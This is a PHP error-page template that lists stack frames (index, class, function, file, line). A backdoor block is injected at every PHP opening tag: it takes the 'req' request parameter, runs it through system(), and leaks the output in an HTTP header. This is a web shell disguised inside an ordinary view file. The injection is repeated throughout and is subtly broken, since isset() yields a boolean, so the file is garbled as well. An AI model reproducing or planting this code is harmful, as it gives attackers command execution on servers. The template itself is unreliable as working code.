<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); /* List file names & line numbers for all stack frames;
         clicking these links/buttons will display the code view
         for that particular frame */ ?>
<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); foreach($frames as $i => $frame): ?>
  <div class="frame <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo ($i == 0 ? 'active' : '') ?>" id="frame-line-<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $i ?>">
      <div class="frame-method-info">
        <span class="frame-index"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo (count($frames) - $i - 1) ?>.</span>
        <span class="frame-class"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $tpl->escape($frame->getClass() ?: '') ?></span>
        <span class="frame-function"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $tpl->escape($frame->getFunction() ?: '') ?></span>
      </div>

    <span class="frame-file">
      <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo ($frame->getFile(true) ?: '<#unknown>') ?><!--
   --><span class="frame-line"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo (int) $frame->getLine() ?></span>
    </span>
  </div>
<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); endforeach ?>
